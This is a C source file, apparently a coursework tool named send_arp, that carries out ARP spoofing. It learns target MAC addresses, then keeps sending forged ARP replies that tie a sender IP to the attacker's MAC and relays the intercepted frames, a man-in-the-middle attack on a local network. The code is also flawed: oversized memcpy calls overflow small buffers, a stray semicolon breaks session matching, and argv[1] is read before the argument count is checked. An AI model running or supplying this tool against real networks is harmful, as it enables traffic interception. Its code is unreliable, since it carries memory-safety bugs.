#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <stdint.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpspoof.h>
#include <pcap.h>
#include <unistd.h>
#include <netinet/in.h>
#include <pthread.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2
const u_char broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
const u_char unknown[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

void print_usage(){
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
    printf("!! Sender IP & Target IP & Your IP in same area !!\n");
}

void my_info_setting(char *dev, uint32_t *ipstr, uint8_t *macstr, uint32_t *netmask){

    ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    ioctl(s, SIOCGIFADDR, &ifr);
    memcpy((char *)ipstr, ifr.ifr_addr.sa_data+2, 32);

    ioctl(s, SIOCGIFNETMASK, &ifr);
    memcpy((char *)netmask, ifr.ifr_netmask.sa_data+2, 32);

    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 48);
}

int ip_range_check(uint32_t myip, uint32_t senderip, uint32_t targetip, uint32_t netmask){

    uint32_t my_area;
    uint32_t sender_area;
    uint32_t target_area;

    myip = ntohl(myip);
    senderip = ntohl(senderip);
    targetip = ntohl(targetip);
    netmask = ntohl(netmask);

    my_area = myip & netmask;
    sender_area = senderip & netmask;
    target_area = targetip & netmask;

    if(my_area == sender_area && sender_area == target_area) return 1;
    else printf("Sender, Target, You !! Three Objects Not in same Area!!\n");
    return 0;

}

arp_packet * makearp(uint8_t * sendermac, uint32_t senderip, uint8_t * targetmac, uint32_t targetip, int flag){

    arp_packet * request_arp = (arp_packet *)malloc(sizeof(arp_packet));

    if(flag == ARP_REQUEST){
        memcpy(request_arp->eth.dest_mac, broadcast, 6);
        request_arp->arp.opcode = htons(0x0001);
        memcpy(request_arp->arp.target_mac, unknown, 6);
    }else{
        memcpy(request_arp->eth.dest_mac, targetmac, 6);
        request_arp->arp.opcode = htons(0x0002);
        memcpy(request_arp->arp.target_mac, targetmac, 6);
    }

    memcpy(request_arp->eth.src_mac, sendermac, 6);
    request_arp->eth.type = htons(0x0806);
    request_arp->arp.hd_type = htons(0x0001);
    request_arp->arp.proto_type = htons(0x0800);
    request_arp->arp.hlen = 0x06;
    request_arp->arp.plen = 0x04;
    request_arp->arp.sender_ip = senderip;
    memcpy(request_arp->arp.sender_mac, sendermac, 6);
    request_arp->arp.target_ip = targetip;
    return request_arp;
}


int main(int argc, char * argv[]){

    pcap_pkthdr* header;
    const u_char* packet;
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    uint32_t myip;
    uint8_t mymac[6];
    uint32_t netmask;

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL){
        fprintf(stderr, "Counln't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    if(argc < 3){
        print_usage();
        return -1;
    }
    int number_of_session = (argc-2)/2;
    session * sessionlist = (session *)malloc(sizeof(session) * (number_of_session));
    my_info_setting(dev, &myip, mymac, &netmask);

    for(int i=0; i < number_of_session; i++){
        sessionlist[i].sender_ip = inet_addr(argv[2*(i+1)]);
        sessionlist[i].target_ip = inet_addr(argv[2*(i+1)+1]);
        sessionlist[i].check = false;
        if(!ip_range_check(myip, sessionlist[i].sender_ip, sessionlist[i].target_ip, netmask)){
            print_usage();
            return -1;
        }
        printf("a");
        sessionlist[i].request_st = makearp(mymac, myip, sessionlist[i].target_mac, sessionlist[i].target_ip, ARP_REQUEST);
    }

    int clear_sessions_mac = 0;
    while(1){
        for(int i=0; i < number_of_session; i++){
            if(!sessionlist[i].check){
                printf("A");
                pcap_sendpacket(handle, (u_char *)sessionlist[i].request_st, sizeof(arp_packet));
                int res = pcap_next_ex(handle, &header, &packet);

                if(res == 0) continue;
                if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

                struct arp_packet *arp_message = (arp_packet *)packet;

                if(arp_message->eth.type == ntohs(0x0806)){
                    if(arp_message->arp.opcode == ntohs(ARP_REPLY)){
                        if(arp_message->arp.sender_ip == sessionlist[i].target_ip){
                            memcpy(sessionlist[i].target_mac, arp_message->arp.sender_mac, 6);
                            sessionlist[i].check = true;
                            clear_sessions_mac += 1;
                        }
                    }
                }
            }
        }
        if(number_of_session == clear_sessions_mac){
            break;
        }
    }

    for(int i=0; i < number_of_session; i++){
        sessionlist[i].request_ts = makearp(mymac, sessionlist[i].sender_ip, sessionlist[i].target_mac, sessionlist[i].target_ip, ARP_REPLY);
    }

    while(1){
        for(int i=0; i < number_of_session; i++){
            pcap_sendpacket(handle, (u_char *)sessionlist[i].request_ts, sizeof(arp_packet));
        }
        int res = pcap_next_ex(handle, &header, &packet);

        if(res == 0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
        ethernet_header * message = (ethernet_header *)packet;

        int session_number = 0;
        for(int i=0; i < number_of_session; i++){
            if(!memcmp(message->src_mac, sessionlist[i].target_mac, 6));
            session_number = i;
        }

        memcpy(message->dest_mac, sessionlist[session_number].target_mac, 6);
        memcpy(message->src_mac, mymac, 6);

        pcap_sendpacket(handle, (u_char *)message, 1000);
    }
}
